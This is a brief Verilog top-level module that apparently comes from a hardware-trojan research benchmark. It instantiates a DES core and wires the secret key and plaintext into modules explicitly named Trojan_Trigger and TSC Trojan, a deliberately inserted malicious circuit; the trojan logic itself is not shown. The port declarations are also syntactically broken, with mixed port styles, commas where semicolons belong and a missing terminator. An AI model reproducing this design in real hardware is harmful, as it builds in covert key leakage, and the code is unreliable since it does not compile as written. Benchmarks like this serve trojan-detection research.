`timescale 1ns / 1ps

module top(clk, rst, decrypt, roundSel, key, desIn, desOut, Tj_Trig);
    input clk,
    input rst,
    input decrypt,
    input [3:0] roundSel,
    input [55:0] key,
    input [63:0] desIn,
    output [63:0] desOut,
	  output [63:0] Tj_Trig

		des DES (clk, roundSel, decrypt, key, desIn, desOut);
		Trojan_Trigger Trigger(rst, clk, desIn, Tj_Trig);
		TSC Trojan (clk, rst, key, Tj_Trig);

endmodule
